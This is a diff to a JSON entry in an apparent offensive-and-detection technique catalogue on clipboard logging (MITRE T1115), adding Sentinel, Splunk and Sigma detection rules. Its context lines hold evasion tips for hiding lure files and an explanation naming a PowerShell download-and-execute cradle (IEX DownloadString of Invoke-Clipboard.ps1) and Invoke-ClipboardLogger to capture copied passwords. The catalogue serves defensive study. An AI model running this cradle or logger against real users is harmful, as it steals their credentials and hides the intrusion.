@@ -90,7 +90,55 @@
       "HTB M26",
       "MITRE T1115"
     ],
-    "evasion": "Blend the lure (SCF/LNK/clipboard) into a share users already browse; keep the capture window short; remove the planted file after a hash lands."
+    "evasion": "Blend the lure (SCF/LNK/clipboard) into a share users already browse; keep the capture window short; remove the planted file after a hash lands.",
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Interacting with Users - Clipboard Logger - Sentinel",
+        "logic": "DeviceEvents\n| where ActionType == \"PowerShellCommand\" and ProcessCommandLine has \"Clipboard\"\n| project Timestamp, DeviceName, InitiatingProcessAccountName, ProcessCommandLine\n| sort by Timestamp desc",
+        "data_source": "powershell",
+        "attack": [
+          "T1115"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "splunk",
+        "name": "Interacting with Users - Clipboard Logger - Splunk",
+        "logic": "index=wineventlog EventCode=4104 (ScriptBlockText=\"*Invoke-ClipboardLogger*\" OR ScriptBlockText=\"*Invoke-Clipboard*\" OR ScriptBlockText=\"*DownloadString*Clipboard*\")\n| table _time, Computer, User, ScriptBlockText",
+        "data_source": "powershell",
+        "attack": [
+          "T1115"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "4104"
+        ]
+      },
+      {
+        "platform": "sigma",
+        "name": "posh_ps_invoke_clipboard_logger",
+        "logic": "posh_ps_invoke_clipboard_logger",
+        "data_source": "windows-security",
+        "attack": [
+          "T1115"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      }
+    ],
+    "visibility": {
+      "requires": [
+        "powershell",
+        "windows-security"
+      ],
+      "better_with": [
+        "edr",
+        "sysmon"
+      ]
+    }
   },
   "explain": "Captures clipboard contents over time to catch copied passwords:\n  IEX(New-Object Net.WebClient).DownloadString('...Invoke-Clipboard.ps1')   fetch and load the logger in memory\n  Invoke-ClipboardLogger   start recording every clipboard change\nUsers frequently copy/paste passwords, so an active session often yields plaintext credentials."
 }
